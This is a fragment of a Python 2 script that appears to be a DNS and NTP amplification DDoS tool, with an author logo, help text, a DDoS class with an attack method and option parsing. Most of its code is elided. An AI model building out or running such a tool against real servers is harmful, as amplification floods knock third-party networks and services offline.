...
LOGO = r'''
 ...
 /_/    \_\_____/_____/_/    \_\_____/_____/|_| \_|
	...
	https://github.com/SleekAssassin35
	   https://oblivioncode.com/
'''

HELP = (
	'DNS Amplification File and Domains to Resolve (e.g: dns.txt:[assassin.com|domains_file.txt]',
...
class DDoS(object):
	...
	def __attack(self):
		...
		global nbytes
		_files = files
		for proto in _files:	# Amplifikasyon dosyalarını aç
...
def main():
	...
	if options.dns:
		...
		if domains:
			...
			print 'Specify domains to resolve (e.g: --dns=dns.txt:assassin.com)'
			sys.exit()
	if options.ntp:
